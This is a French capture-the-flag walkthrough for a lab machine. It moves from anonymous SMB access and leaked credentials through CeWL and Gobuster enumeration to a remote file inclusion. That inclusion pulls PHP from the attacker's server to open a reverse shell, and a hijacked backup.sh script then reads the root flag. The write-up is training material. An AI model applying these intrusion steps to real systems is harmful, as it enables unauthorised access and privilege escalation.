# Celeste Mountain CTF Walkthrough

## Sommaire

1. [Accès SMB (Samba)](#1-accès-smb-samba)
2. [Récupération de Credentials](#2-récupération-de-credentials)
3. [Exploration Web & CeWL](#3-exploration-web--cewl)
4. [Gobuster et Page Cachée](#4-gobuster-et-page-cachée)
5. [LFI vers RCE via Paramètre `urlConfig`](#5-lfi-vers-rce-via-paramètre-urlconfig)
6. [Reverse Shell et Escalade de Privilèges](#6-reverse-shell-et-escalade-de-privilèges)

---

## 1. Accès SMB (Samba)

On se connecte anonymement à un partage Samba :

```bash
smbclient //10.10.230.210/anonymous -U guest
```

On explore les fichiers partagés et on tombe sur un list de mot de passe et un user on les tests sur le site `squirrel-mail` et on obtien la combinaison qui fonctionne :

```
badeline:Raptorsensei
```

Dans `squirrel-name` on nous donne un mot de passe.

## 2. Récupération de Credentials

On se conecte sur le Samba en tant que badeline avec le mot de passe obtenue dans `squirrel-mail` et on récupére un fichier nommé `secret plan.txt`:

```
It seems people are trying to hack me down!
Never mind this, they'll never be **cewl** enough to find the hidden directory
Remember to use this page: https://celestegame.fandom.com/wiki/Theo
```

## 3. Exploration Web & CeWL

Le fichier nous oriente vers une page web où l’on doit utiliser **CeWL** pour générer une wordlist personnalisée :

```bash
cewl https://celestegame.fandom.com/wiki/Theo -w wordlist.txt
```

## 4. Gobuster et Page Cachée

Avec cette wordlist, on utilise **Gobuster** pour énumérer les répertoires :

```bash
gobuster dir -u http://10.10.75.174/ -w wordlist.txt
```

On trouve une page cachée : `/theounderstars`.

## 5. LFI vers RCE via Paramètre `urlConfig`

Dans le panneau admin, une page vulnérable permet d’injecter une URL externe :

```
http://10.10.75.174/theounderstars/admin/alerts/alertConfigField.php?urlConfig=http://10.8.92.59:8081/reverse.txt
```

On place un fichier `reverst.txt` contenant du code PHP malicieux sur notre serveur local, ce qui nous donne un **reverse shell**.

## 6. Reverse Shell et Escalade de Privilèges

Une fois dans le shell, on se connecte à nouveau en tant que `badeline` avec :

```bash
su badeline
# Password: Raptorsensei
```
🎉 **1er Flag obtenu**


On remarque qu’on peut renommer un dossier système et créer un dossier du même nom contenant un fichier `backup.sh`.

On place un script comme ceci :

```bash
#!/bin/bash
cat /root/root.txt > /tmp/root.txt
```

On attend ou déclenche l’exécution automatique de `backup.sh`.

Résultat : le flag root est copié dans un fichier lisible ! 🎉

🎉 **2ème Flag obtenu**
---
